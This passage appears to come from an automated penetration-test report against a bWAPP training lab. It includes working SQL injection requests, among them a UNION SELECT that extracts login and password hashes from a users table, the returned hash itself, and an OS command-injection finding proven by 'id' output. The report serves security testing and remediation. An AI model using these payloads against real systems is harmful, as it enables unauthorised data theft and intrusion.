+        &lt;label for=&quot;title&quot;&gt;Search for a movie:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;title&quot; name=&quot;title&quot; size=&quot;25&quot;&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;action&quot; value=&quot;search&quot;&gt;Search&lt;/button&gt;
+
+        &lt;/p&gt;
+
+    &lt;/form&gt;
+
+    &lt;table id=&quot;table_yellow&quot;&gt;
+
+        &lt;tr height=&quot;30&quot; bgcolor=&quot;#ffb717&quot; align=&quot;center&quot;&gt;
+
+            &lt;td width=&quot;200&quot;&gt;&lt;b&gt;Title&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Release&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;140&quot;&gt;&lt;b&gt;Character&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Genre&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;IMDb&lt;/b&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+        &lt;tr height=&quot;30&quot;&gt;
+
+            &lt;td colspan=&quot;5&quot; width=&quot;580&quot;&gt;No movies were found!&lt;/td&gt;
+            &lt;!--
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            --&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;side&quot;&gt;
+
+    &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/twitter.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://be.linkedin.com/in/malikmesellem&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/linkedin.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://www.facebook.com/pages/MME-IT-Audits-Security/104153019664877&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/facebook.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/blogger.png&quot;&gt;&lt;/a&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;disclaimer&quot;&gt;
+
+    &lt;p&gt;bWAPP is licensed under &lt;a rel=&quot;license&quot; href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;vertical-align:middle&quot; src=&quot;./images/cc.png&quot;&gt;&lt;/a&gt; &amp;copy; 2014 MME BVBA / Follow &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;_blank&quot;&gt;@MME_IT&lt;/a&gt; on Twitter and ask for our cheat sheet, containing all solutions! / Need an exclusive &lt;a href=&quot;http://www.mmebvba.com&quot; target=&quot;_blank&quot;&gt;training&lt;/a&gt;?&lt;/p&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bee&quot;&gt;
+
+    &lt;img src=&quot;./images/bee_1.png&quot;&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;security_level&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Set your security level:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;security_level&quot;&gt;
+
+            &lt;option value=&quot;0&quot;&gt;low&lt;/option&gt;
+            &lt;option value=&quot;1&quot;&gt;medium&lt;/option&gt;
+            &lt;option value=&quot;2&quot;&gt;high&lt;/option&gt;
+
+        &lt;/select&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;form_security_level&quot; value=&quot;submit&quot;&gt;Set&lt;/button&gt;
+        &lt;font size=&quot;4&quot;&gt;Current: &lt;b&gt;low&lt;/b&gt;&lt;/font&gt;
+
+    &lt;/form&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bug&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Choose your bug:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;bug&quot;&gt;
+
+&lt;o</pre></details><details><summary>Transcript r18: GET http://192.168.223.221:8080/sqli_1.php?title=1%27+ORDER+BY+7--+-&amp;action=search -> 200</summary><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+
+&lt;!--&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://fonts.googleapis.com/css?family=Architects+Daughter&quot;&gt;--&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;stylesheets/stylesheet.css&quot; media=&quot;screen&quot; /&gt;
+&lt;link rel=&quot;shortcut icon&quot; href=&quot;images/favicon.ico&quot; type=&quot;image/x-icon&quot; /&gt;
+
+&lt;!--&lt;script src=&quot;//html5shiv.googlecode.com/svn/trunk/html5.js&quot;&gt;&lt;/script&gt;--&gt;
+&lt;script src=&quot;js/html5.js&quot;&gt;&lt;/script&gt;
+
+&lt;title&gt;bWAPP - SQL Injection&lt;/title&gt;
+
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;header&gt;
+
+&lt;h1&gt;bWAPP&lt;/h1&gt;
+
+&lt;h2&gt;an extremely buggy web app !&lt;/h2&gt;
+
+&lt;/header&gt;
+
+&lt;div id=&quot;menu&quot;&gt;
+
+    &lt;table&gt;
+
+        &lt;tr&gt;
+
+            &lt;td&gt;&lt;a href=&quot;portal.php&quot;&gt;Bugs&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;password_change.php&quot;&gt;Change Password&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;user_extra.php&quot;&gt;Create User&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;security_level_set.php&quot;&gt;Set Security Level&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;reset.php&quot; onclick=&quot;return confirm(&#x27;All settings will be cleared. Are you sure?&#x27;);&quot;&gt;Reset&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;credits.php&quot;&gt;Credits&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;_blank&quot;&gt;Blog&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;logout.php&quot; onclick=&quot;return confirm(&#x27;Are you sure you want to leave?&#x27;);&quot;&gt;Logout&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;font color=&quot;red&quot;&gt;Welcome Bee&lt;/font&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;main&quot;&gt;
+
+    &lt;h1&gt;SQL Injection (GET/Search)&lt;/h1&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;GET&quot;&gt;
+
+        &lt;p&gt;
+
+        &lt;label for=&quot;title&quot;&gt;Search for a movie:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;title&quot; name=&quot;title&quot; size=&quot;25&quot;&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;action&quot; value=&quot;search&quot;&gt;Search&lt;/button&gt;
+
+        &lt;/p&gt;
+
+    &lt;/form&gt;
+
+    &lt;table id=&quot;table_yellow&quot;&gt;
+
+        &lt;tr height=&quot;30&quot; bgcolor=&quot;#ffb717&quot; align=&quot;center&quot;&gt;
+
+            &lt;td width=&quot;200&quot;&gt;&lt;b&gt;Title&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Release&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;140&quot;&gt;&lt;b&gt;Character&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Genre&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;IMDb&lt;/b&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+        &lt;tr height=&quot;30&quot;&gt;
+
+            &lt;td colspan=&quot;5&quot; width=&quot;580&quot;&gt;No movies were found!&lt;/td&gt;
+            &lt;!--
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            --&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;side&quot;&gt;
+
+    &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/twitter.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://be.linkedin.com/in/malikmesellem&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/linkedin.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://www.facebook.com/pages/MME-IT-Audits-Security/104153019664877&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/facebook.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/blogger.png&quot;&gt;&lt;/a&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;disclaimer&quot;&gt;
+
+    &lt;p&gt;bWAPP is licensed under &lt;a rel=&quot;license&quot; href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;vertical-align:middle&quot; src=&quot;./images/cc.png&quot;&gt;&lt;/a&gt; &amp;copy; 2014 MME BVBA / Follow &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;_blank&quot;&gt;@MME_IT&lt;/a&gt; on Twitter and ask for our cheat sheet, containing all solutions! / Need an exclusive &lt;a href=&quot;http://www.mmebvba.com&quot; target=&quot;_blank&quot;&gt;training&lt;/a&gt;?&lt;/p&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bee&quot;&gt;
+
+    &lt;img src=&quot;./images/bee_1.png&quot;&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;security_level&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Set your security level:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;security_level&quot;&gt;
+
+            &lt;option value=&quot;0&quot;&gt;low&lt;/option&gt;
+            &lt;option value=&quot;1&quot;&gt;medium&lt;/option&gt;
+            &lt;option value=&quot;2&quot;&gt;high&lt;/option&gt;
+
+        &lt;/select&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;form_security_level&quot; value=&quot;submit&quot;&gt;Set&lt;/button&gt;
+        &lt;font size=&quot;4&quot;&gt;Current: &lt;b&gt;low&lt;/b&gt;&lt;/font&gt;
+
+    &lt;/form&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bug&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Choose your bug:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;bug&quot;&gt;
+
+&lt;o</pre></details><details><summary>Transcript r19: GET http://192.168.223.221:8080/sqli_1.php?title=1%27+ORDER+BY+8--+-&amp;action=search -> 200</summary><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+
+&lt;!--&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://fonts.googleapis.com/css?family=Architects+Daughter&quot;&gt;--&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;stylesheets/stylesheet.css&quot; media=&quot;screen&quot; /&gt;
+&lt;link rel=&quot;shortcut icon&quot; href=&quot;images/favicon.ico&quot; type=&quot;image/x-icon&quot; /&gt;
+
+&lt;!--&lt;script src=&quot;//html5shiv.googlecode.com/svn/trunk/html5.js&quot;&gt;&lt;/script&gt;--&gt;
+&lt;script src=&quot;js/html5.js&quot;&gt;&lt;/script&gt;
+
+&lt;title&gt;bWAPP - SQL Injection&lt;/title&gt;
+
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;header&gt;
+
+&lt;h1&gt;bWAPP&lt;/h1&gt;
+
+&lt;h2&gt;an extremely buggy web app !&lt;/h2&gt;
+
+&lt;/header&gt;
+
+&lt;div id=&quot;menu&quot;&gt;
+
+    &lt;table&gt;
+
+        &lt;tr&gt;
+
+            &lt;td&gt;&lt;a href=&quot;portal.php&quot;&gt;Bugs&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;password_change.php&quot;&gt;Change Password&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;user_extra.php&quot;&gt;Create User&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;security_level_set.php&quot;&gt;Set Security Level&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;reset.php&quot; onclick=&quot;return confirm(&#x27;All settings will be cleared. Are you sure?&#x27;);&quot;&gt;Reset&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;credits.php&quot;&gt;Credits&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;_blank&quot;&gt;Blog&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;logout.php&quot; onclick=&quot;return confirm(&#x27;Are you sure you want to leave?&#x27;);&quot;&gt;Logout&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;font color=&quot;red&quot;&gt;Welcome Bee&lt;/font&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;main&quot;&gt;
+
+    &lt;h1&gt;SQL Injection (GET/Search)&lt;/h1&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;GET&quot;&gt;
+
+        &lt;p&gt;
+
+        &lt;label for=&quot;title&quot;&gt;Search for a movie:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;title&quot; name=&quot;title&quot; size=&quot;25&quot;&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;action&quot; value=&quot;search&quot;&gt;Search&lt;/button&gt;
+
+        &lt;/p&gt;
+
+    &lt;/form&gt;
+
+    &lt;table id=&quot;table_yellow&quot;&gt;
+
+        &lt;tr height=&quot;30&quot; bgcolor=&quot;#ffb717&quot; align=&quot;center&quot;&gt;
+
+            &lt;td width=&quot;200&quot;&gt;&lt;b&gt;Title&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Release&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;140&quot;&gt;&lt;b&gt;Character&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Genre&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;IMDb&lt;/b&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+        &lt;tr height=&quot;50&quot;&gt;
+
+            &lt;td colspan=&quot;5&quot; width=&quot;580&quot;&gt;Error: Unknown column &#x27;8&#x27; in &#x27;order clause&#x27;</pre></details><details><summary>Transcript r20: GET http://192.168.223.221:8080/sqli_1.php?title=1%27+UNION+SELECT+login%2C+password%2C+NULL%2C+NULL%2C+NULL%2C+NULL%2C+NULL+FROM+users+LIMIT+5--+-&amp;action=search -> 200</summary><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+
+&lt;!--&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://fonts.googleapis.com/css?family=Architects+Daughter&quot;&gt;--&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;stylesheets/stylesheet.css&quot; media=&quot;screen&quot; /&gt;
+&lt;link rel=&quot;shortcut icon&quot; href=&quot;images/favicon.ico&quot; type=&quot;image/x-icon&quot; /&gt;
+
+&lt;!--&lt;script src=&quot;//html5shiv.googlecode.com/svn/trunk/html5.js&quot;&gt;&lt;/script&gt;--&gt;
+&lt;script src=&quot;js/html5.js&quot;&gt;&lt;/script&gt;
+
+&lt;title&gt;bWAPP - SQL Injection&lt;/title&gt;
+
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;header&gt;
+
+&lt;h1&gt;bWAPP&lt;/h1&gt;
+
+&lt;h2&gt;an extremely buggy web app !&lt;/h2&gt;
+
+&lt;/header&gt;
+
+&lt;div id=&quot;menu&quot;&gt;
+
+    &lt;table&gt;
+
+        &lt;tr&gt;
+
+            &lt;td&gt;&lt;a href=&quot;portal.php&quot;&gt;Bugs&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;password_change.php&quot;&gt;Change Password&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;user_extra.php&quot;&gt;Create User&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;security_level_set.php&quot;&gt;Set Security Level&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;reset.php&quot; onclick=&quot;return confirm(&#x27;All settings will be cleared. Are you sure?&#x27;);&quot;&gt;Reset&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;credits.php&quot;&gt;Credits&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;_blank&quot;&gt;Blog&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;logout.php&quot; onclick=&quot;return confirm(&#x27;Are you sure you want to leave?&#x27;);&quot;&gt;Logout&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;font color=&quot;red&quot;&gt;Welcome Bee&lt;/font&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;main&quot;&gt;
+
+    &lt;h1&gt;SQL Injection (GET/Search)&lt;/h1&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;GET&quot;&gt;
+
+        &lt;p&gt;
+
+        &lt;label for=&quot;title&quot;&gt;Search for a movie:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;title&quot; name=&quot;title&quot; size=&quot;25&quot;&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;action&quot; value=&quot;search&quot;&gt;Search&lt;/button&gt;
+
+        &lt;/p&gt;
+
+    &lt;/form&gt;
+
+    &lt;table id=&quot;table_yellow&quot;&gt;
+
+        &lt;tr height=&quot;30&quot; bgcolor=&quot;#ffb717&quot; align=&quot;center&quot;&gt;
+
+            &lt;td width=&quot;200&quot;&gt;&lt;b&gt;Title&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Release&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;140&quot;&gt;&lt;b&gt;Character&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Genre&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;IMDb&lt;/b&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+        &lt;tr height=&quot;30&quot;&gt;
+
+            &lt;td&gt;6885858486f31043e5839c735d99457f045affd0&lt;/td&gt;
+            &lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
+            &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;http://www.imdb.com/title/&quot; target=&quot;_blank&quot;&gt;Link&lt;/a&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+        &lt;tr height=&quot;30&quot;&gt;
+
+            &lt;td&gt;6885858486f31043e5839c735d99457f045affd0&lt;/td&gt;
+            &lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
+            &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;http://www.imdb.com/title/&quot; target=&quot;_blank&quot;&gt;Link&lt;/a&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;side&quot;&gt;
+
+    &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/twitter.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://be.linkedin.com/in/malikmesellem&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/linkedin.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://www.facebook.com/pages/MME-IT-Audits-Security/104153019664877&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/facebook.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/blogger.png&quot;&gt;&lt;/a&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;disclaimer&quot;&gt;
+
+    &lt;p&gt;bWAPP is licensed under &lt;a rel=&quot;license&quot; href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;vertical-align:middle&quot; src=&quot;./images/cc.png&quot;&gt;&lt;/a&gt; &amp;copy; 2014 MME BVBA / Follow &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;_blank&quot;&gt;@MME_IT&lt;/a&gt; on Twitter and ask for our cheat sheet, containing all solutions! / Need an exclusive &lt;a href=&quot;http://www.mmebvba.com&quot; target=&quot;_blank&quot;&gt;training&lt;/a&gt;?&lt;/p&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bee&quot;&gt;
+
+    &lt;img src=&quot;./images/bee_1.png&quot;&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;security_level&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Set your security level:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;security_level&quot;&gt;
+
+            &lt;option value=&quot;0&quot;&gt;low&lt;/option&gt;
+            &lt;option value=&quot;1&quot;&gt;medium&lt;/opti</pre></details><p><b>Remediation</b><br>Use parameterised queries.</p><details><summary><b>Proof grade: proven</b></summary><p class='meta'>Requirement for sqli: the DBMS fingerprint plus at least one row from a named table, bounded to what proves the read</p><ul><li>&#10003; proof read from the wire</li><li>&#10003; the target produced the quoted bytes &mdash; <i>from r20</i></li><li>&#10003; data store fingerprinted &mdash; <i>5.5.9-1ubuntu in r1</i></li><li>&#10003; the query named its target &mdash; <i>users in r20</i></li><li>&#10003; the rows are not what the page serves anyway &mdash; <i>6885858486f31043e5839c735d99457f045affd0 in r20 and in no control</i></li><li>&#10003; rows returned, not an error message &mdash; <i>quoted from r20</i></li><li>&#10003; extraction stayed minimal</li><li>&#10007; the citation is small enough to grade whole &mdash; <i>20 exchanges cited; the first 16 were paired. A contrast needs two exchanges - cite the pair that proves it</i></li></ul></details></div><div class='finding' style='border-left-color:#7c1d1d'><h3>F02 - OS command injection in commandi.php target parameter</h3><p><span class='badge' style='background:#7c1d1d'>CRITICAL</span> <span class='badge' style='background:#1e7b34'>PROOF: PROVEN</span> &nbsp; <b>Category:</b> rce &nbsp; <b>Endpoint:</b> <code>http://192.168.223.221:8080</code> &nbsp; <b>CWE:</b> <code>CWE-78</code> &nbsp; <b>OWASP:</b> A03 Injection</p><p><b>Description</b><br>The `target` field reaches a shell: `id` output came back with this probe&#x27;s own nonce.</p><p><b>Proof (verbatim excerpt)</b></p><pre>uid=33(www-data)</pre><details><summary>Transcript r21: POST http://192.168.223.221:8080/commandi.php -> 200</summary><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+
+&lt;!--&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://fonts.googleapis.com/css?family=Architects+Daughter&quot;&gt;--&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;stylesheets/stylesheet.css&quot; media=&quot;screen&quot; /&gt;
+&lt;link rel=&quot;shortcut icon&quot; href=&quot;images/favicon.ico&quot; type=&quot;image/x-icon&quot; /&gt;
+
+&lt;!--&lt;script src=&quot;//html5shiv.googlecode.com/svn/trunk/html5.js&quot;&gt;&lt;/script&gt;--&gt;
+&lt;script src=&quot;js/html5.js&quot;&gt;&lt;/script&gt;
+
+&lt;title&gt;bWAPP - OS Command Injection&lt;/title&gt;
+
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;header&gt;
+
+&lt;h1&gt;bWAPP&lt;/h1&gt;
+
+&lt;h2&gt;an extremely buggy web app !&lt;/h2&gt;
+
+&lt;/header&gt;
+
+&lt;div id=&quot;menu&quot;&gt;
+
+    &lt;table&gt;
+
+        &lt;tr&gt;
+
+            &lt;td&gt;&lt;a href=&quot;portal.php&quot;&gt;Bugs&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;password_change.php&quot;&gt;Change Password&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;user_extra.php&quot;&gt;Create User&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;security_level_set.php&quot;&gt;Set Security Level&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;reset.php&quot; onclick=&quot;return confirm(&#x27;All settings will be cleared. Are you sure?&#x27;);&quot;&gt;Reset&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;credits.php&quot;&gt;Credits&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;_blank&quot;&gt;Blog&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;logout.php&quot; onclick=&quot;return confirm(&#x27;Are you sure you want to leave?&#x27;);&quot;&gt;Logout&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;font color=&quot;red&quot;&gt;Welcome Bee&lt;/font&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;main&quot;&gt;
+
+    &lt;h1&gt;OS Command Injection&lt;/h1&gt;
+
+    &lt;form action=&quot;/commandi.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;p&gt;
+
+        &lt;label for=&quot;target&quot;&gt;DNS lookup:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;target&quot; name=&quot;target&quot; value=&quot;www.nsa.gov&quot;&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;form&quot; value=&quot;submit&quot;&gt;Lookup&lt;/button&gt;
+
+        &lt;/p&gt;
+
+    &lt;/form&gt;
+    &lt;p align=&quot;left&quot;&gt;&lt;/p&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;side&quot;&gt;
+
+    &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/twitter.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://be.linkedin.com/in/malikmesellem&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/linkedin.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://www.facebook.com/pages/MME-IT-Audits-Security/104153019664877&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/facebook.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/blogger.png&quot;&gt;&lt;/a&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;disclaimer&quot;&gt;
+
